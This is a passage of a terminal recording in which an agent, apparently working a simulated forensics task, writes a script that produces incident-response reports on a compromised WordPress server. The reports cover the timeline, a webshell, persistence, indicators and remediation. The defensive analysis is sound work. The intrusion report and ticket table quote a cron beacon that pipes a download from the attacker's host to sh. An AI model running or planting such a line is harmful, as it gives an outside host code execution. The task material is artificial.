[146.31791, "i", "cat << 'EOF' > /tmp/generate_reports.py\nimport os\n\nprogress_content = \"\"\"# Investigation Progress & Timeline\n\n## Working Checklist\n- [x] Initial alert review (`/sas/alerts.json:2`)\n- [x] Advisory and CTI mapping (`/sas/cti/advisory.txt:5`)\n- [x] Forensic disk file enumeration (`/disk/var/www/html/index.html`)\n- [x] Web server log analysis (`/disk/var/log/nginx/access.log:297`)\n- [x] System and authentication log analysis (`/disk/var/log/auth.log:196`)\n- [x] Persistence mechanisms identification (`/disk/var/spool/cron/crontabs/www-data:5`, `/disk/var/www/html/.htaccess:2`)\n- [x] Web shell and defacement analysis (`/disk/var/www/html/wp-content/plugins/contact/inc.php:4`, `/disk/var/www/html/index.html:1`)\n- [x] Anti-forensic artifact recovery (`/disk/var/lib/.cache/.wiped.bin:1`)\n- [x] Baseline and vulnerability assessment (`/disk/var/www/html/wp-config.php:4`, `/sas/vulns.json:2`)\n- [x] Change ticket reconciliation (`/sas/handoff/change-ticket.md:1`)\n\n## Chronological Timeline of Events\n- **2026-08-09 00:53:21 - 00:55:20 UTC**: Attacker launched SSH password brute-force attack from IP `198.51.100.40` against multiple user accounts (`oracle`, `postgres`, `test`, `root`, `admin`) as documented in `/disk/var/log/auth.log:146`.\n- **2026-08-09 00:55:23 UTC**: Attacker successfully authenticated via SSH as `root` from IP `198.51.100.40` using password authentication (`/disk/var/log/auth.log:196`).\n- **2026-08-09 03:11:17 UTC**: Attacker sent HTTP POST request to `/uploads/shell.php` from IP `198.51.100.40` (`/disk/var/log/nginx/access.log:297`).\n- **2026-08-09 03:12:49 UTC**: Attacker attempted exploit payload (`/disk/var/log/nginx/access.log:298`).\n- **2026-08-09 03:20:00 UTC**: EDR high-severity alert cluster triggered and incident opened (`/sas/handoff/intake.pdf:1`, `/sas/alerts.json:2`).\n- **2026-08-09 (Post-compromise)**: Attacker planted PHP webshell at `/disk/var/www/html/wp-content/plugins/contact/inc.php:4`, planted cron persistence at `/disk/var/spool/cron/crontabs/www-data:5`, modified `.htaccess` for traffic redirection (`/disk/var/www/html/.htaccess:2`), defaced `index.html` (`/disk/var/www/html/index.html:1`), and wiped cache binary (`/disk/var/lib/.cache/.wiped.bin:1`).\n\"\"\"\n\nintrusion_content = \"\"\"# Incident Intrusion Report\n\n## Executive Summary\nAn external attacker operating from IP address `198.51.100.40` compromised the target host `wordpress-prod-01`. The attack sequence involved initial exploitation and SSH brute-force access, planting of a PHP webshell backdoor, website defacement, malicious traffic redirection via `.htaccess`, cron-based persistent beaconing, and anti-forensic wiping of cache artifacts. While endpoint monitoring alerted on the webshell and defacement, silent persistence and anti-forensic activities were uncovered during disk forensics.\n\n## Attack Chain & Technical Details\n\n### 1. Initial Access & Exploitation (ATT&CK T1190)\n- **Vector**: Vulnerability in the Contact/School Management plugin (CVE-2022-1609) and concurrent SSH brute-forcing (`/sas/vulns.json:2`, `/disk/var/log/auth.log:146`).\n- **Origin IP**: `198.51.100.40` (`/disk/var/log/auth.log:196`, `/disk/var/log/nginx/access.log:297`).\n- **Evidence**:\n  - Web exploitation traffic: `` `/disk/var/log/nginx/access.log:297` ``\n  - SSH successful brute force login: `` `/disk/var/log/auth.log:196` ``\n  - Vulnerability report: `` `/sas/vulns.json:2` ``\n\n### 2. Backdoor & Web Shell Persistence (ATT&CK T1505.003)\n- **Artifact**: Backdoor planted at `/var/www/html/wp-content/plugins/contact/inc.php`.\n- **Capability**: Backdoor obfuscation evaluating base64-decoded PHP payloads passed in request bodies (`/disk/var/www/html/wp-content/plugins/contact/inc.php:4`).\n- **Alert Status**: Detected by endpoint security (`/sas/alerts.json:2`).\n- **Evidence**: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``\n\n### 3. Internal Defacement (ATT&CK T1491.001)\n- **Impact**: Default web page replaced with defacement content `hacked=CHK-02`.\n- **Artifact**: `/var/www/html/index.html`.\n- **Alert Status**: Detected by endpoint security (`/sas/al"]
[146.319009, "i", "erts.json:10`).\n- **Evidence**: `` `/disk/var/www/html/index.html:1` ``\n\n### 4. Malicious Traffic Redirection (ATT&CK T1505.003) — Silent\n- **Impact**: All web traffic redirected via `.htaccess` RewriteRule to IP `198.51.100.40`.\n- **Artifact**: `/var/www/html/.htaccess`.\n- **Alert Status**: **SILENT** (not in `/sas/alerts.json`).\n- **Evidence**: `` `/disk/var/www/html/.htaccess:2` ``\n\n### 5. Scheduled Task / Cron Persistence (ATT&CK T1053.003) — Silent\n- **Impact**: Cron job installed for user `www-data` executing periodic curl beacon to `hxxp://198.51.100.40/x | sh` to re-drop payloads (`xmrig`, `pgdaemon`, `php`, `redis`, `wget`).\n- **Artifact**: `/var/spool/cron/crontabs/www-data`.\n- **Alert Status**: **SILENT** (not in `/sas/alerts.json`).\n- **Evidence**: `` `/disk/var/spool/cron/crontabs/www-data:5` ``\n\n### 6. Anti-Forensics / Indicator Removal (ATT&CK T1070) — Silent\n- **Impact**: Wiped cache binary attempting to obscure C2 beaconing (`198.51.100.40`, `update-wordpress[.]example[.]cn`) and credential cache fragments.\n- **Artifact**: `/var/lib/.cache/.wiped.bin`.\n- **Alert Status**: **SILENT** (not in `/sas/alerts.json`).\n- **Evidence**: `` `/disk/var/lib/.cache/.wiped.bin:1` ``\n\n## Entities & Indicators of Compromise (IOCs)\n- **Attacker IP**: `198.51.100.40` (`/disk/var/log/auth.log:196`)\n- **C2 Domain**: `update-wordpress.example.cn` (`/disk/var/lib/.cache/.wiped.bin:1`)\n- **Mining Pool**: `stratum+tcp://xmr.wordpress.evil:3333` (`/sas/cti/advisory.txt:24`)\n- **Wallet Address**: `4A0000000000000000001b88b8daaa21` (`/sas/cti/advisory.txt:25`)\n\"\"\"\n\nvuln_content = \"\"\"# Vulnerability Assessment Report\n\n## Entry Vulnerability Analysis\n\n### Primary Exploit Vector: CVE-2022-1609\n- **Vulnerability Title**: School Management / Contact Plugin Backdoor RCE\n- **CVE ID**: CVE-2022-1609 (`/sas/vulns.json:2`, `/sas/cti/advisory.txt:18`)\n- **CVSS Score**: 9.8 (CRITICAL) v3.1\n- **CWE**: CWE-94 (Improper Control of Generation of Code - Code Injection)\n- **Affected File Path**: `/var/www/html/wp-content/plugins/contact/inc.php` (`/disk/var/www/html/wp-content/plugins/contact/inc.php:4`)\n- **Description**: The plugin contains obfuscated backdoor functionality injected into license-checking code that registers a REST API handler, allowing unauthenticated remote attackers to execute arbitrary PHP code.\n- **Evidence Path**: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``\n- **Alert Reference**: `` `/sas/vulns.json:2` `` and `` `/sas/alerts.json:2` ``\n\n### Secondary Vector: SSH Authentication Weakness\n- **Description**: Weak SSH root account password permitted successful brute-force authentication from external IP `198.51.100.40`.\n- **Evidence Path**: `` `/disk/var/log/auth.log:196` ``\n\"\"\"\n\nbaseline_content = \"\"\"# Baseline and Configuration Weakness Report\n\n## Identified Baseline Deficiencies\n\n### 1. Weak Database Credentials & Insecure Configuration (BAS-01)\n- **Check ID**: CHK-05 / BAS-01\n- **Path**: `/var/www/html/wp-config.php`\n- **Weakness Details**:\n  - Weak database password (`DB_PASSWORD`) configured in plain text.\n  - WordPress XML-RPC endpoint enabled, exposing the site to brute-force attacks and amplification vectors.\n- **Evidence Path**: `` `/disk/var/www/html/wp-config.php:4` ``\n- **SAS Alert Reference**: `` `/sas/alerts.json:18` `` and `` `/sas/baseline.json:2` ``\n\n### 2. Insecure File Permissions & Web Root Writeability\n- **Path**: `/var/www/html/.htaccess` and `/var/www/html/wp-content/plugins/`\n- **Weakness Details**: Web server user (`www-data`) had excessive write privileges allowing creation/modification of `.htaccess` redirects and PHP webshell files.\n- **Evidence Path**: `` `/disk/var/www/html/.htaccess:2` `` and `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``\n\n### 3. Direct Root SSH Password Login Enabled\n- **Path**: `/var/log/auth.log`\n- **Weakness Details**: SSH configuration allowed direct root login via password authentication over public network interfaces.\n- **Evidence Path**: `` `/disk/var/log/auth.log:196` ``\n\"\"\"\n\nremediation_content = \"\"\"# Remediation and Response Pla"]
[146.319426, "o", "cat << 'EOF' > /tmp/generate_reports.py\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.319439, "i", "n\n\n## Change Ticket Reconciliation (CHG-1481)\n\nReconciled changes based on forensic findings from `/disk` and threat intelligence in `/sas`:\n\n| # | Action | Target | Status | Rationale & Cited Evidence |\n|---|--------|--------|--------|----------------------------|\n| 1 | Block source IP inbound | `198.51.100.40` | PROPOSED | Corrected from `203.0.113.9`. True attacker origin IP identified across auth logs and web logs. Citation: `` `/disk/var/log/auth.log:196` `` |\n| 2 | Patch plugin RCE (CVE-2022-1609) | `/var/www/html/wp-content/plugins/contact` | PROPOSED | Corrected from CVE-2019-0708 (BlueKeep). Patch or remove vulnerable contact plugin. Citation: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` `` |\n| 3 | Remove cron persistence | `/var/spool/cron/crontabs/www-data` | OPEN | Downgraded from DONE to OPEN. Crontab for `www-data` still contains active beacon command `curl hxxp://198.51.100.40/x`. Citation: `` `/disk/var/spool/cron/crontabs/www-data:5` `` |\n| 4 | Quarantine webshell backdoor | `/var/www/html/wp-content/plugins/contact/inc.php` | PROPOSED | Backup and quarantine the webshell file instead of unverified deletion. Citation: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` `` |\n| 5 | Remove malicious `.htaccess` redirect | `/var/www/html/.htaccess` | PROPOSED | Remove RewriteRule redirecting traffic to attacker IP `198.51.100.40`. Citation: `` `/disk/var/www/html/.htaccess:2` `` |\n| 6 | Restore defaced web index | `/var/www/html/index.html` | PROPOSED | Replace defaced `index.html` with clean backup version. Citation: `` `/disk/var/www/html/index.html:1` `` |\n| 7 | Harden `wp-config.php` & disable XML-RPC | `/var/www/html/wp-config.php` | PROPOSED | Update weak DB password and disable XML-RPC API. Citation: `` `/disk/var/www/html/wp-config.php:4` `` |\n| 8 | Disable root SSH password login & rotate keys | `/etc/ssh/sshd_config` | PROPOSED | Prevent SSH password brute-force access; require SSH key auth and disable direct root login. Citation: `` `/disk/var/log/auth.log:196` `` |\n\n## Actionable Remediation Sequence\n\n1. **Containment & Network Isolation**\n   - Add firewall rule blocking inbound/outbound traffic for IP `198.51.100.40` (Citation: `` `/disk/var/log/auth.log:196` ``).\n   - Block domain `update-wordpress.example.cn` at DNS/firewall level (Citation: `` `/disk/var/lib/.cache/.wiped.bin:1` ``).\n\n2. **Persistence Removal & Web Restoration (Prefer Backup/Quarantine over Deletion)**\n   - Backup and remove cron job line from `/var/spool/cron/crontabs/www-data` (Citation: `` `/disk/var/spool/cron/crontabs/www-data:5` ``).\n   - Move `/var/www/html/wp-content/plugins/contact/inc.php` to isolated quarantine storage (Citation: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``).\n   - Remove malicious RewriteRule from `/var/www/html/.htaccess` (Citation: `` `/disk/var/www/html/.htaccess:2` ``).\n   - Restore `/var/www/html/index.html` from clean backup (Citation: `` `/disk/var/www/html/index.html:1` ``).\n\n3. **System Hardening & Vulnerability Patching**\n   - Update or remove vulnerable WordPress plugin (CVE-2022-1609) (Citation: `` `/sas/vulns.json:2` ``).\n   - Update `wp-config.php` with strong database password and disable XML-RPC functionality (Citation: `` `/disk/var/www/html/wp-config.php:4` ``).\n   - Configure `/etc/ssh/sshd_config` to `PermitRootLogin no` and `PasswordAuthentication no` (Citation: `` `/disk/var/log/auth.log:196` ``).\n\n4. **Verification & Monitoring**\n   - Verify crontab cleanliness: `crontab -u www-data -l`.\n   - Monitor Nginx access logs for suspicious POST requests.\n   - Run baseline integrity check on web directory files.\n\"\"\"\n\nwith open('/app/progress.md', 'w') as f:\n    f.write(progress_content)\n\nwith open('/app/intrusion-report.md', 'w') as f:\n    f.write(intrusion_content)\n\nwith open('/app/vuln-report.md', 'w') as f:\n    f.write(vuln_content)\n\nwith open('/app/baseline-report.md', 'w') as f:\n    f.write(baseline_content)\n\nwith open('/app/remediation-plan.md', 'w') as f:\n    f.write(remediation_content)\n\nprint(\"All 5 report deliverables generated s"]
